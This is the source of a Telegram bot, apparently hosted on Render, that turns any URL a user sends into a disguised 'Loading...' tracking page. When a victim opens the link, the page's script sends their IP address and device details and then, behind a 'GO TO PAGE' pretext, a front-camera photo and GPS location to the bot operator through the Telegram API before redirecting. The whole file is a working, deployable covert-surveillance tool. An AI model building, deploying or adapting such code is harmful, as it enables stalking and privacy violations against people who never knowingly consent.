from flask import Flask, request, jsonify, send_from_directory
import telebot
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ========== CONFIGURATION ==========
TOKEN = os.environ.get("BOT_TOKEN")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
STATS_FILE = "stats.json"

os.makedirs(HTML_DIR, exist_ok=True)

if not os.path.exists(STATS_FILE):
    with open(STATS_FILE, "w") as f:
        json.dump({"total_links": 0}, f)

bot = telebot.TeleBot(TOKEN)

def increment_links():
    with open(STATS_FILE, "r") as f:
        stats = json.load(f)
    stats["total_links"] = stats.get("total_links", 0) + 1
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def get_link_count():
    with open(STATS_FILE, "r") as f:
        stats = json.load(f)
    return stats.get("total_links", 0)

def delete_old_files():
    cutoff_time = datetime.now() - timedelta(minutes=10)
    if os.path.exists(HTML_DIR):
        for filename in os.listdir(HTML_DIR):
            if filename.endswith('.html'):
                filepath = os.path.join(HTML_DIR, filename)
                try:
                    if datetime.fromtimestamp(os.path.getmtime(filepath)) < cutoff_time:
                        os.remove(filepath)
                except:
                    pass

def start_auto_cleanup():
    def cleanup_loop():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup_loop, daemon=True).start()

def delete_user_old_links(user_id):
    if os.path.exists(HTML_DIR):
        for filename in os.listdir(HTML_DIR):
            if filename.startswith(f"v_{user_id}_") and filename.endswith('.html'):
                try:
                    os.remove(os.path.join(HTML_DIR, filename))
                except:
                    pass

def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False

def get_user_state(user_id):
    try:
        with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "r") as f:
            return json.load(f)
    except:
        return {"state": None}

def set_user_state(user_id, data):
    with open(os.path.join(HTML_DIR, f"user_{user_id}.json"), "w") as f:
        json.dump(data, f)

def generate_html(user_id, target_url):
    delete_user_old_links(user_id)
    filename = f"v_{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, filename)
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * {{ user-select: none; }}
        body {{ background: #fff; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial; }}
        .spinner {{ width: 40px; height: 40px; border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 10px; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
        .btn {{ background: #3498db; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer; margin-top: 20px; }}
        .skip {{ background: #95a5a6; }}
    </style>
</head>
<body>
<div style="text-align:center">
    <div id="step1"><div class="spinner"></div><div>Loading...</div></div>
    <div id="step2" style="display:none"><button class="btn" onclick="requestCamera()">GO TO PAGE</button><div id="errorMsg" style="color:red"></div></div>
    <div id="step3" style="display:none"><div class="spinner"></div><div>Camera access...</div></div>
    <div id="step4" style="display:none"><div class="spinner"></div><div>Location (optional)...</div><button class="btn skip" onclick="skipLocation()">Skip</button></div>
    <div id="step5" style="display:none"><div class="spinner"></div><div>Redirecting...</div></div>
</div>
<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>
<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const TARGET = "{target_url}";
let skipped = false;

async function sendToUser(text, file=null) {{
    try {{
        if(file) {{
            let fd = new FormData();
            fd.append('chat_id', USER);
            fd.append('photo', file);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
        }} else {{
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text}})}});
        }}
    }} catch(e) {{}}
}}

async function getIP() {{ try{{let r=await fetch('https://api.ipify.org?format=json');return (await r.json()).ip;}}catch(e){{return'Unknown';}} }}

async function capturePhoto() {{
    try {{
        let s = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        let v = document.getElementById('video');
        v.srcObject = s;
        await new Promise(r => v.onloadedmetadata = () => {{ v.play(); r(); }});
        await new Promise(r => setTimeout(r, 300));
        let c = document.getElementById('canvas');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        let blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
        if(blob && blob.size > 500) await sendToUser('FRONT CAMERA:', blob);
        s.getTracks().forEach(t => t.stop());
        return true;
    }} catch(e) {{ return false; }}
}}

async function getLocation() {{
    return new Promise(r => {{
        if(!navigator.geolocation) r(false);
        navigator.geolocation.getCurrentPosition(p => {{ sendToUser('Location: https://www.google.com/maps?q='+p.coords.latitude+','+p.coords.longitude); r(true); }}, () => r(false), {{timeout:8000}});
    }});
}}

async function skipLocation() {{
    skipped = true;
    document.getElementById('step4').style.display = 'none';
    document.getElementById('step5').style.display = 'block';
    await sendToUser('Location: Skipped');
    setTimeout(() => window.location.href = TARGET, 1500);
}}

async function requestCamera() {{
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
    let ok = await capturePhoto();
    if(ok) {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step4').style.display = 'block';
        setTimeout(async () => {{ if(!skipped) await getLocation(); }}, 100);
    }} else {{
        document.getElementById('step3').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
        document.getElementById('errorMsg').innerHTML = 'Camera required!';
    }}
}}

async function start() {{
    let ip = await getIP();
    await sendToUser('IP: '+ip+'\\nDevice: '+navigator.userAgent.split('(')[0]);
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
}}
start();
</script>
</body>
</html>"""
    
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    increment_links()
    return filename

# ========== BOT HANDLERS ==========
def process_update(update):
    try:
        if hasattr(update, 'message') and update.message:
            msg = update.message
            text = msg.text if msg.text else ""
            chat_id = msg.chat.id
            user_name = msg.from_user.first_name
            
            if text == '/start':
                if not is_subscribed(chat_id):
                    markup = telebot.types.InlineKeyboardMarkup()
                    markup.add(telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/nrtecno2"))
                    markup.add(telebot.types.InlineKeyboardButton("Verify", callback_data="verify"))
                    bot.send_message(chat_id, f"Join {REQUIRED_CHANNEL} first!", reply_markup=markup)
                else:
                    set_user_state(chat_id, {"state": "waiting_url"})
                    bot.send_message(chat_id, "Send me any URL")
            
            elif text.startswith(('http://', 'https://')):
                state = get_user_state(chat_id)
                if state.get("state") == "waiting_url":
                    filename = generate_html(chat_id, text)
                    set_user_state(chat_id, {"state": None})
                    link = f"https://{ACCOUNT_NAME}.onrender.com/view/{filename}"
                    bot.send_message(chat_id, f"Your link:\n{link}\n\nExpires in 10 minutes")
                else:
                    bot.send_message(chat_id, "Use /start first")
            else:
                if text != '/start':
                    bot.send_message(chat_id, "Send a valid URL")
    except Exception as e:
        logger.error(f"Process error: {e}")

def process_callback(call):
    try:
        if call.data == "verify":
            if is_subscribed(call.from_user.id):
                bot.edit_message_text("Verified! Send URL:", call.from_user.id, call.message.message_id)
                set_user_state(call.from_user.id, {"state": "waiting_url"})
            else:
                bot.answer_callback_query(call.id, "Join channel first!", True)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ========== FLASK ROUTES ==========
@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        json_str = request.get_data().decode('UTF-8')
        data = json.loads(json_str)
        
        if 'message' in data:
            process_update(telebot.types.Update.de_json(json_str))
        elif 'callback_query' in data:
            process_callback(telebot.types.Update.de_json(json_str))
        
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/view/<filename>')
def serve_html(filename):
    return send_from_directory(HTML_DIR, filename)

@app.route('/')
def home():
    return f"DRAGON ACTIVE | Total Links: {get_link_count()}"

# ========== MAIN ==========
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    start_auto_cleanup()
    app.run(host='0.0.0.0', port=port)
